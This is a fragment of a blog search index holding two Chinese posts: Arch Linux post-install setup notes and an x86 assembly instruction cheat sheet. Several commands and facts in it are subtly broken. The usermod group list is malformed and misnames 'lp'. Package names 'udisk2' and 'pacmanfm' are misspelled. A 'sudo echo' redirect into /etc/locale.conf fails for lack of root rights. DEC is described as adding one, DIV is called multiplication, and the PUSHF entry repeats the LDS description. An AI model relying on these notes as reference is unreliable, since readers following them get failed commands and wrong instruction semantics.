lun # usermod -aG wheel, users, storage, power, Ip, adm, optical, lun 修改sudoer文件 # vim /etc/sudoers ------------------ %wheel ALL=(ALL) ALL (取消第82行注释) 重启reboot 桌面环境 xorg $ sudo pacman -Syyu $ sudo pacman -S xorg xorg-xinit $ sudo pacman -S [选一款桌面环境] 字体设置（取消两行的注释） $ sudo vim /etc/locale.gen -------------------------- en_US.UTF-8 UTF-8 zh_CN.UTF-8 UTF-8 -------------------------- $ sudo echo &quot;LANG=en_US.UTF-8&quot; &gt; /etc/locale.conf # 英文 $ sudo echo &quot;LANG=zh_CN.UTF-8&quot; &gt; /etc/locale.conf # 中文 $ sudo locale-gen # 生成字体 在vim中按下/键进入搜索模式 安装一些字体 英文 $ sudo pacman -S ttf-dejavu ttf-droid ttf-hack ttf-font-awesome ttf-lato ttf-liberation ttf-linux-libertine ttf-opensans ttf-roboto ttf-roboto-mono ttf-ubuntu-font-family 中文相关字体 $ sudo pacman -S ttf-hannom noto-fonts noto-fonts-extra noto-fonts-emoji noto-fonts-cjk $ sudo pacman -S adobe-source-code-pro-fonts adobe-source-sans-fonts adobe-source-serif-fonts adobe-source-han-sans-cn-fonts adobe-source-han-sans-hk-fonts adobe-source-han-sans-tw-fonts adobe-source-han-serif-cn-fonts $ sudo pacman -S wqy-zenhei wqy-microhei 开启freetype2引擎渲染字体 $ sudo vim /etc/profile.d/freetype2.sh -------------------------------------- # Subpixel hinting mode can be chosen by setting the right TrueType ... # Uncomment and configure below # 取消下面这行注释 export FREETYPE_PROPERTIES=&quot;truetype:interpreter-version=40&quot; -------------------------------------- 安装显卡驱动 AMD $ sudo pacman -S xf86-video-amdgpu xf86-video-ati mesa vulkan-radeon Intel $ sudo pacman -S xf86-video-intel mesa vulkan-intel NVIDIA $ sudo pacman -S nvidia nvidia-settings nvidia-utils 声音相关软件包 $ sudo pacman -S alsa-utils pulseaudio pulseaudio-bluetooth cups 安装一些工具 $ sudo pacman -S git cmake 7z unzip unrar fakeroot AUR源 $ mkdir ~/Github $ cd ~/Github $ git clone https://aur.archlinux.org/paru.git $ cd paru $ makepkg -si paru配置 $ sudo vim /etc/paru.conf ------------------------- ... DevelSuffixes = -git -cvs -svn -bzr -darcs -always -hg #AurOnly BottomUp # 取消第17行BottomUp的注释 #RemoveMake ... ------------------------- wps $ paru wps ---------- ... 12 aur/wifite-mod-pixiewps-git 67.cb8a19e-3 [+10 ~0.00] A tool to attack multiple WEP and WPA encrypted networks at the same time mod with Pixie Dust Attack support 11 aur/wps-office-mui-zh-cn 11.1.0.10702-2 [+19 ~1.73] [Installed] Chinese (Simplified) mui package for WPS Office 10 aur/wps-office-mime-cn 11.1.0.10702-2 [+19 ~1.73] Mime files provided by Kingsoft Office (WPS Office) cn version 9 aur/wps-office-cn 11.1.0.10702-2 [+19 ~1.73] [Installed] Kingsoft Office (WPS Office) CN version - an office productivity suite ... ---------- :: Packages to install (eg: 1 2 3, 1-3): :: 9 11 # 安装9 11 一个是wps,一个是wps的字体 udisk2 udiskie 是关于U盘等设备自动挂载的软件 pcmanfm 是有图形化界面的文件管理器 $ sudo pacman -S udisk2 udiskie pacmanfm ","link":"https://Zer0-hex.github.io/arch-linux-an-zhuang/"},{"title":"X86常用汇编指令速查表","content":"数据传送指令 🙄 通用数据传送指令 MOV 格式：MOV dst,src 功能：将src传送到dst 限制：段寄存器间不可直接相互传送，立即数不能直接送段寄存器，CS 不可作为目的操作数。 PUSH &amp; POP 格式：PUSH src &amp; POP dst 功能：将 src 压栈 &amp; 出栈送入 dst 限制：CS 不可作目的操作数 XCHG 格式：XCHG dst,src 含义：交换两者（Exchange） 限制：段寄存器不可为操作数，也不能同时为存储单元 XLAT 格式：XLAT 含义：转换表（Table Look-up Translation） 功能：用 AL 内容查表，结果存回 AL，表格位于 DS:BX 地址目标传送指令 LEA 格式：LEA dst,src 含义：取有效地址（Load Effective Address） 功能：取src地址偏移量送dst 注：源操作数必须是存储单元，目的操作数必须是除段寄存器之外的 16 位寄存器。 LDS &amp; LES 格式：LDS dst,src &amp; LES dst,src 含义：取双字指针送到目的寄存器和 DS/ES 功能：从源操作数指定的存储单元中取出 4 字节，前两个字节送到目的寄存器，后两个字节送到 DS/ES。 标志传送指令 PUSHF &amp; POPF 格式：PUSHF &amp; POPF 含义：将标志寄存器压栈/出栈 功能：从源操作数指定的存储单元中取出 4 字节，前两个字节送到目的寄存器，后两个字节送到 DS/ES。 LAHF &amp; SAHF 格式：LAHF &amp; SAHF 含义：Load(Store) AH from(into) Flags 功能：将标志寄存器送到 AH &amp; 将 AH 送到标志寄存器 输入输出指令 IN &amp; OUT 格式：IN AL/AX, ADDR &amp; OUT ADDR, AL/AX 功能：从端口地址（寄存器）获取数据送到寄存器（端口地址） 地址格式：端口地址有两种格式，小于 FFH 时可以是直接写出，否则必须先送入 DX 再使用。 算术运算指令 加减法指令 ADD &amp; ADC 格式：ADD dst,src &amp; ADC dst,src 含义：（带进位）加法 功能：dst = src + dst (+ CF) INC 格式：INC dst 功能：自增 1，dst = dst + 1 SUB &amp; SBB: 格式：SUB dst,src &amp; SBB dst,src 含义：（带借位）减法 功能：dst = dst - src (- CF) DEC: 格式：DEC dst 功能：自减 1，dst = dst + 1 NEG: 格式：NEG dst 功能：对目的操作数取负，dst = -dst 乘除法指令 MUL &amp; IMUL 格式：IMUL src &amp; MUL src 含义：无符号数/整数乘法 功能：只有一个源操作数，当其为 8 位时，AX = AL * src，为 16 位时，（DX,AX）= AX * src DIV &amp; IDIV 格式：IDIV src &amp; DIV src 含义：无符号数/整数乘法 功能：只有一个源操作数作为除数，当其为 8 位时，AX 为被除数，AL 作为商，AH 作为余数。当 src 为 16 位时，（DX,AX）作为被除数，AX 作为商，DX 作为余数。 逻辑运算与移位指令 逻辑运算 指令 功能 NOT dst 取反，逻辑非 AND dst,src 逻辑与 OR dst,src 逻辑或 XOR dst,src 异或 算术逻辑移位 指令 含义 功能 SAL dst,cnt Shift Arithmetic Left 算术左移 cnt 位 SAR dst,cnt Shift Arithmetic Right 算术右移 cnt 位 SHL dst,cnt Shift Logic Left 逻辑左移 cnt 位 SHR dst,cnt Shift Logic Right 逻辑右移 cnt 位 cnt 为 1 或者 CL。算术右移时补最高位，逻辑右移补 0，被移出的移入 CF。 循环移位 指令 含义 功能 ROL dst,cnt Rotate Left 循环左移 cnt 位 ROR dst,cnt Rotate Right 循环右移 cnt 位 RCL dst,cnt Rotate through Carry Left 带进位左移 cnt 位 RCR dst,cnt Rotate through Carry Right 带进位右移 cnt 位 字符串操作指令 指令（字节/字） 功能 MOVSB / MOVSW 字符串传送 CMPSB / CMPSW 字符串比较 SCASB / SCASW 字符串扫描 LODSB / LODSW 字符串装入 STOSB / STOSW 字符串存储 对于后三条指令，操作使用 AL/AX 寄存器（根据操作数类型决定）。 源串起始地址为 DS:SI，目的串位于 ES:DI 每一次操作都会自动修改 SI 和 DI DF 标志位可以控制字符串处理方向，DF = 0 递增，DF = 1 递减，可通过 CLD/STD 设置 处理字符串长度放在 CX 中 这些指令前可以用重复前缀 REP 反复执行，或是 REPE/REPZ 相等/为零则重复，REPNE/REPNZ 不相等/非零则重复。 处理器控制指令 标志处理指令 指令 含义 功能 CLC Clear Carry CF = 0 CMC Complement Carry CF = NOT CF STC Set Carry CF = 1 CLD Clear Direction DF = 0 STD Set Direction DF = 1 CLI Clear Interrupt IF = 0 STI Set Interrupt IF = 1 外部同步指令 ESC 格式：ESC 外部操作码，src 功能：用来实现对 8087 协处理器控制。 WAIT 格式：WAIT 功能：往往跟在 ESC 后等待，直到 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯TESTTEST¯ 为低电平。 LOCK 格式：LOCK 功能：封锁总线，禁止其他处理器使用总线。 停机和空操作 HLT 格式：HLT 功能：进入暂停状态不进行任何操作，直到复位或 NMI 引脚/INTR 引脚出现中断请求信号。 NOP 格式：NOP 功能：耗费三个时钟周期但不进行任何操作。 控制转移指令 比较指令 CMP 格式：CMP dst,src 功能：用 dst 减去 src，但结果仅反映到标志位，不送回目的操作数。 TEST 格式：TEST dst,src 功能：对两个操作数作逻辑与，结果仅反映到标志位，不送回目的操作数。 无条件转移 JMP 格式：JMP dst 功能：无条件跳转到目的地址。 跳转分为两种，一种是段内转移或近（NEAR）转移，跳转时仅改变 IP 的值，另一种是段间转移或远（FAR）转移，此时跳转长度超过 IP 最大值，CS 和 IP 都要改变。这两种情况都提供直接转移和间接转移两种方法，前者直接给出目的地址，后者将目的地址放在寄存器或者存储单元中。 类型 方式 寻址目标 举例 段内 直接 立即短转移（8位） JMP SHORT 标号 段内 直接 立即近转移（16位） JMP NEAR PTR 标号或JMP 标号 段内 间接 寄存器（16位） JMP BX 段内 间接 存储器（16位） JMP WORD PTR 5[BX] 段间 直接 立即转移（32位） JMP FAR PTR 标号 段间 间接 存储器（32位） JMP DWORD PTR[REG] CALL 格式：CALL 过程名 功能：调用过程。 同样有段内与段间，直接与间接的区分，指令格式与 JMP 类似。 类型 方式 寻址目标 举例 段内 直接 立即调用 CALL 标号 段内 间接 寄存器（16位） CALL BX 段内 间接 存储器（16位） CALL WORD PTR 5[BX] 段间 直接 立即调用（32位） CALL FAR PTR 标号 段间 间接 存储器（32位） CALL DWORD PTR[REG] RET 格式：RET (n) 功能：过程返回。如果有 n 则在弹出返回地址后再弹出 n 个字节，这一目的是让调用过程可以传递参数。 条件转移 格式：操作符 标号 功能：根据操作符，满足即跳转到标号。 直接标志转移 指令 测试条件 判断条件 JC/JNC CF = 1 / 0 有 / 无进位 JZ/JNZ ZF = 1 / 0 相等 / 不相等 JE/JNE ZF = 1 / 0 相等 / 不相等 JS/JNS SF = 1 / 0 符号为负 / 正 JO/JNO OF = 1 / 0 溢出 / 无溢出 JP/JNP PF = 1 / 0 为偶数 / 奇数 JPE/JPO PF = 1 / 0 为偶数 / 奇数 无符号数比较测试 指令 测试条件 判断条件 JA/JNBE CF ∨∨ ZF = 0 高于 / 不低于等于 JAE/JNB CF = 0 高于等于 / 不低于 JNAE/JB CF = 1 不高于等于 / 低于 JNA/JBE CF ∨∨ ZF = 1 不高于 / 低于等于 有符号数比较测试 指令 测试条件 判断条件 JG/JNLE (SF XORXOR OF) ∨∨ ZF = 0 大于 / 不小于等于 JGE/JNL SF XORXOR OF = 0 大于等于 / 不小于 JNGE/JL SF XORXOR OF = 1 不大于等于 / 小于 JNG/JLE (SF XORXOR OF) ∨∨ ZF = 1 不大于 / 小于等于 循环控制指令 LOOP 格式：LOOP 标号 功能：跳至标号继续循环，每执行一次 CX 减一，若减一后为零则不跳转。 LOOPE &amp; LOOPNE 格式：LOOPE 标号 &amp; LOOPNE 标号 功能：（不）相等时循环，其他与 LOOP 相同。 LOOPZ &amp; LOOPNZ 格式：LOOPZ 标号 &amp; LOOPNZ 标号 功能：结果（不）为零时循环，其他与 LOOP 相同。 JCXZ 格式：JCXZ 标号 功能：CX 为零则跳转，否则就往下执行， CS 不会减一。 中断指令 INT 格式：INT n 功能：调用 n 对应的功能。 INTO 格式：INTO 功能：如果溢出标识 OF 为 1 则产生类型为 4 的中断，否则就继续向下执行。 IRET 格式：IRET 功能：中断返回。 BIOS &amp; DOS 调用 调用这两者用的是 INT 中断指令。 格式：INT n 功能：调用 n 对应的功能。 其中 n = 21H 是最为强大的 DOS 中断。一般调用中断须先将参数放入指定寄存器，功能号放入 AH，子功能号放入 AL，例如 1 2 MOV AX,4C00H INT 21H 常用的功能号有 功能号 功能 参数 01H 输入一个字符 AL = 输入字符 0AH 输入字符串 DX:DX = 缓冲区首地址 02H 显示一个字符 DL = 显示字符 09H 显示 $ 结尾的字符串 DX:DX = 字符串首地址 ","link":"https://Zer0-hex.github.io/x86-chang-yong-hui-bian-zhi-ling-su-cha-biao/"}]}